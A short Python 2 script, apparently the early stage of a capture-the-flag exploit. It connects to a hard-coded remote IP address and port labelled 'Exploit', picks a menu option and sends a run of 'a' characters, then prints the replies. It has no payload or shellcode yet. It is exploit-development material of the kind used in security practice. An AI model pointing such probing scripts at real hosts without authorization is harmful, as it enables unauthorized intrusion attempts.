__author__ = 'HuyNA'
import os
import socket
import time
import struct
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 58.229.183.19 / TCP 30000
host = "58.229.183.19"
local_host="192.168.248.157"
port = 30000
s.connect((host, port))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

print recv_until(s, ",,,? ")
send_data = "2\n"
s.send(send_data)
time.sleep(0.2)
print s.recv(len("# "))
send_data = "a"*15+"\n"
s.send(send_data)
time.sleep(0.2)

data = s.recv(1024)
print data
data = s.recv(1024)
print data
data = s.recv(1024)
print data



"""

"""